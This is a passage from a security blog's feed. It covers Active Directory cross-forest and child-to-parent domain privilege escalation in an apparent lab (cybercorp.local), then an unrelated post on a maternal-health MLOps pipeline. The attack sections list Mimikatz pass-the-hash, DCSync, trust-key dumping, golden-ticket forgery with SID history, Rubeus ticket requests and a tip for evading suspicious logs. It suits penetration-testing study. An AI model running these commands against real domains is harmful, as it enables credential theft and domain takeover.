&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-ForeignGroup&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;evilcorp.local&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>We get an ObjectSID that we have to search in our current domain to see if it exists:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetUser&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">objectsid&lt;/span> &lt;span class="o">-eq&lt;/span> &lt;span class="s2">&amp;#34;S-1-5-21-738119705-704267045-3387619857-1275&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>The ObjectSID corresponds to STUDENT2. Let’s impersonate STUDENT2 who is a user of the domain cybercorp.local:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikats&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;sekurlsa::pth /user:STUDENT2 /domain:cybercorp.local /ntlm:6b164d3b190489426e9bcb4a01df5b53 /run:powershell.exe&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Then we can access the other forest:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">ls &lt;/span>&lt;span class="p">\\&lt;/span>&lt;span class="nb">evil-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">evilcorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">local&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">$&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="search-for-interesting-acls">Search for interesting ACLs&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Search for interesting ACLs in the evilcorp.local forest filtering the results belonging to users in our current domain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-ACLScanner&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="n">evilcorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentitySID&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s2">&amp;#34;S-1-5-21-738119705-704267045-3387619857&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>The user STUDENT1 in our cyberlab.cybercorp.local has GenericAll rights on STUDENT3 in evilcorp.local. This means, interesting stuff, like password reset can be done on STUDENT3 (using Powerview dev):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView_dev&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-DomainUserPassword&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="n">STUDENT3&lt;/span> &lt;span class="n">-AccountPassword&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">ConvertTo-SecureString&lt;/span> &lt;span class="s2">&amp;#34;Password@123&amp;#34;&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">AsPlainText&lt;/span> &lt;span class="n">-Force&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="n">evilcorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;hr></description></item><item><title>Across Domain Trusts cheatsheet</title><link>https://www.peco602.com/post/0050-across-domain-trusts-cheatsheet/</link><pubDate>Thu, 08 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/post/0050-across-domain-trusts-cheatsheet/</guid><description>&lt;p>Domains in same forest have an implicit two-way trust with other domains. There is a trust key between the parent and child domains. There are two ways of escalating privileges between two domains of same forest:&lt;/p>
&lt;ul>
&lt;li>Krbtgt hash&lt;/li>
&lt;li>Trust Tickets&lt;/li>
&lt;/ul>
&lt;h2 id="child-to-parent-using-trust-tickets">Child to Parent using Trust Tickets&lt;/h2>
&lt;ol>
&lt;li>Look for [In] trust key from child to parent:&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;lsadump::trust /patch&amp;#34;&amp;#39;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc.cyberlab.cybercorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;lsadump::dcsync /user:cyberlab\cybercorp$&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>An inter-realm TGT can be forged:&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;Kerberos::golden /user:[USER] /domain:[CURRENT_DOMAIN_FQDN] /sid:[CURRENT_DOMAIN_SID] /sids:[ENTERPRISE_ADMINS_GROUP_SID] /rc4:[TRUST_KEY_NTLM] /service:krbtgt /target:[PARENT_DOMAIN_FQDN] /ticket:[TICKET_EXPORT_PATH]&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;Kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-15-21-280534878-1496970234-700767426-519 /rc4:7ef5be456dc8d7450fb8f5f7348746c5 /service:krbtgt /target:cybercorp.local /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Parameter&lt;/th>
&lt;th>Optional&lt;/th>
&lt;th>Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>&lt;strong>/user&lt;/strong>&lt;/td>
&lt;td>No&lt;/td>
&lt;td>Username to impersonate&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;strong>/domain&lt;/strong>&lt;/td>
&lt;td>No&lt;/td>
&lt;td>Domain FQDN&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;strong>/sid&lt;/strong>&lt;/td>
&lt;td>No&lt;/td>
&lt;td>SID of the current domain&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;strong>/sids&lt;/strong>&lt;/td>
&lt;td>No&lt;/td>
&lt;td>SID of the enterprise admins group of the parent domain&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;strong>/rc4&lt;/strong>&lt;/td>
&lt;td>No&lt;/td>
&lt;td>NTLM (RC4) hash of the trust key account. Use &lt;strong>/aes128&lt;/strong> and &lt;strong>/aes256&lt;/strong> for using AES keys&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;strong>/target&lt;/strong>&lt;/td>
&lt;td>No&lt;/td>
&lt;td>Target server FQDN&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;strong>/service&lt;/strong>&lt;/td>
&lt;td>No&lt;/td>
&lt;td>Target service in the parent domain (krbtgt)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>/id&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>User RID (default 500)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>/groups&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>Group RID (default 513 512 520 518 519)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>/startoffset&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>When the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>/endin&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>/renewmax&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>Ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>/ptt&lt;/td>
&lt;td>&lt;/td>
&lt;td>Injects the ticket into the current PowerShell process (no need to save the ticket on disk)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;strong>/ticket&lt;/strong>&lt;/td>
&lt;td>&lt;/td>
&lt;td>Saves the ticket to a file for later use&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;ol start="3">
&lt;li>Get a TGS for a service (e.g. CIFS) in the target domain by using the forged trust ticket. Tickets for other services (like HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM) can be created as well:&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># asktgs.exe &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">asktgs&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">AD&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Tools&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">kekeo_old&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">trust_tkt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span> &lt;span class="n">CIFS&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="nb">cybercorp-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cybercorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="4">
&lt;li>Use the TGS to access the targeted service (may need to use it twice).&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># kirbikator.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">kirbikator&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">lsa&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">CIFS&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">cybercorp-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cybercorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="5">
&lt;li>Access the file share on the parent domain DC:&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">ls &lt;/span>&lt;span class="p">\\&lt;/span>&lt;span class="nb">cybercorp-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cybercorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">local&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">$&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Alternatively, it is possible to use &lt;code>Kekeo&lt;/code> to ask for the TGS:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">Rubeus&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">asktgs&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">ticket&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">AD&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Tools&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">kekeo_old&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">trust_tkt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">service&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">CIFS&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="nb">cybercorp-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cybercorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">dc&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="nb">cybercorp-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cybercorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">ptt&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="child-to-parent-using-krbtgt-hash">Child to Parent using krbtgt hash&lt;/h2>
&lt;ol>
&lt;li>Look for krbtgt hash:&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;lsadump::lsa /patch&amp;#34;&amp;#39;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc.cyberlab.cybercorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Generate a Golden Ticket forcing the SID History parameter. We will abuse SID history once again. The mimkatz option &amp;ldquo;/sids&amp;rdquo; is forcefully setting the SID History for the Enterprise Admin group for cyberlab.cybercorp.local that is the Forest Enterprise Admin Group:&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::golden /user:Administrator /domain:[CURRENT_DOMAIN_FQDN] /sid:[CURRENT_DOMAIN_SID] /sids:[ENTERPRISE_ADMINS_GROUP_SID] /krbtgt:[KRBTGT_NTLM_HASH] /ticket:[TICKET_EXPORT_PATH]&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-15-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
&lt;li>Pass the ticket to the current session on any machine of the current domain:&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="4">
&lt;li>Now, it is possible to access to machine services in the forest root domain:&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">ls &lt;/span>&lt;span class="p">\\&lt;/span>&lt;span class="nb">cybercorp-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cybercorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">local&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">$&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">gwmi &lt;/span>&lt;span class="n">-class&lt;/span> &lt;span class="n">win32_operatingsystem&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="nb">cybercorp-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cybercorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In order to avoid suspicious logs, impersonate Domain Controller account add to the SID History the SIDs of parent Domain Controllers group and Enterprise Domain Controllers group and set the group to 516 (Enterprise Admins group).&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Group&lt;/th>
&lt;th>SID&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Domain Controllers&lt;/td>
&lt;td>S-1-5-21-[DOMAIN_ID]-516&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Enterprise Domain Controllers&lt;/td>
&lt;td>S-1-5-9&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::golden /user:[DC_NAME]$ /domain:[CURRENT_DOMAIN_FQDN] /sid:[CURRENT_DOMAIN_SID] /groups:516 /sids:[PARENT_DOMAIN_CONTROLLERS_GROUP_SID],[ENTERPRISE_DOMAIN_CONTROLLERS_GROUP_SID] /krbtgt:[KRBTGT_HASH] /ptt&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::golden /user:dc$ /domain:cyberlab.cybercorp.local /sid:S-1-5-211874506631-3219952063-538504511 /groups:516 /sids:S-1-521-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ptt&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr></description></item><item><title>Maternal Health Risk Predictor</title><link>https://www.peco602.com/project/0040-maternal-health-mlops/</link><pubDate>Tue, 06 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/project/0040-maternal-health-mlops/</guid><description>&lt;h2 id="introduction">Introduction&lt;/h2>
&lt;p>According to the World Health Organization (WHO):&lt;/p>
&lt;p>&amp;ldquo;&lt;em>Maternal health refers to the health of women during pregnancy, childbirth and the post-natal period. Each stage should be a positive experience, ensuring women and their babies reach their full potential for health and well-being. Although important progress has been made in the last two decades, about 295 000 women died during and following pregnancy and childbirth in 2017. This number is unacceptably high. The most common direct causes of maternal injury and death are excessive blood loss, infection, high blood pressure, unsafe abortion, and obstructed labour, as well as indirect causes such as anemia, malaria, and heart disease. Most maternal deaths are preventable with timely management by a skilled health professional working in a supportive environment. Ending preventable maternal death must remain at the top of the global agenda. At the same time, simply surviving pregnancy and childbirth can never be the marker of successful maternal health care. It is critical to expand efforts reducing maternal injury and disability to promote health and well-being. Every pregnancy and birth is unique. Addressing inequalities that affect health outcomes, especially sexual and reproductive health and rights and gender, is fundamental to ensuring all women have access to respectful and high-quality maternity care.&lt;/em>&amp;rdquo;&lt;/p>
&lt;p>The goal of the project is to apply what has been learned during the MLOps Zoomcamp course to build a MLOps pipeline for woman health risk prediction during pregnancy.&lt;/p>
&lt;h2 id="dataset">Dataset&lt;/h2>
&lt;p>The dataset used to feed the MLOps pipeline has been downloaded from &lt;a href="https://www.kaggle.com/datasets/pyuxbhatt/maternal-health-risk" target="_blank" rel="noopener">Kaggle&lt;/a> and contains data collected from several hospitals, community clinics and maternal health cares through an IoT-based risk monitoring system. The dataset is updated daily and is characterized by the following features:&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Feature&lt;/th>
&lt;th>Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Age&lt;/td>
&lt;td>Age when a woman is pregnant.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>SystolicBP&lt;/td>
&lt;td>Upper value of blood pressure.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>DiastolicBP&lt;/td>
&lt;td>Lower value of blood pressure.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>BS&lt;/td>
&lt;td>Blood glucose levels in terms of molar concentration.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>HeartRate&lt;/td>
&lt;td>A normal resting heart rate.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>BodyTemp&lt;/td>
&lt;td>Average human body temperature.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Risk Level&lt;/td>
&lt;td>Predicted risk intensity level during pregnancy considering the previous attributes.&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="mlops-pipeline">MLOps pipeline&lt;/h2>
&lt;h3 id="architecture">Architecture&lt;/h3>
&lt;img src="./architecture.png" width="100%"/>
&lt;h3 id="deployment">Deployment&lt;/h3>
&lt;p>The MLOps pipeline is fully dockerised and can be easily deployed via the following steps:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Clone the &lt;code>maternal-health-risk&lt;/code> repository locally:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ git clone https://github.com/Peco602/maternal-health-risk.git
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Install the pre-requisites necessary to run the pipeline:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ &lt;span class="nb">cd&lt;/span> maternal-health-risk
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ sudo apt install make
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ make prerequisites
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It is also suggested to add the current user to the &lt;code>docker&lt;/code> group to avoid running the next steps as &lt;code>sudo&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ sudo groupadd docker
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ sudo usermod -aG docker &lt;span class="nv">$USER&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>then, logout and log back in so that the group membership is re-evaluated.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>[&lt;em>Optional&lt;/em>] Configure the development evironment:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ make setup
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This is required to perform further development and testing on the pipeline.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>[&lt;em>Optional&lt;/em>] Insert Kaggle credentials in the &lt;code>.env&lt;/code> file to allow the automatic scheduled dataset update:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Kaggle credentials&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">KAGGLE_USERNAME&lt;/span>&lt;span class="o">=&lt;/span>*****
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">KAGGLE_KEY&lt;/span>&lt;span class="o">=&lt;/span>*****
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In case the credentials are not available, the training dataset &lt;code>data/data.csv&lt;/code> must be updated manually.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Pull the Docker images:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">$ make pull
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Launch the MLOps pipeline:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">$ make run
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once ready, the following services will be available:&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Service&lt;/th>
&lt;th>Port&lt;/th>
&lt;th>Interface&lt;/th>
&lt;th>Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Web Application&lt;/td>
&lt;td>80&lt;/td>
&lt;td>0.0.0.0&lt;/td>
&lt;td>Prediction web service (see picture below)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Prefect&lt;/td>
&lt;td>4200&lt;/td>
&lt;td>127.0.0.1&lt;/td>
&lt;td>Training workflow orchestration&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>MLFlow&lt;/td>
&lt;td>5000&lt;/td>
&lt;td>127.0.0.1&lt;/td>
&lt;td>Experiment tracking and model registry&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>MinIO&lt;/td>
&lt;td>9001&lt;/td>
&lt;td>127.0.0.1&lt;/td>
&lt;td>S3-equivalent bucket management&lt;/td>
&lt;/tr>
&lt;tr>
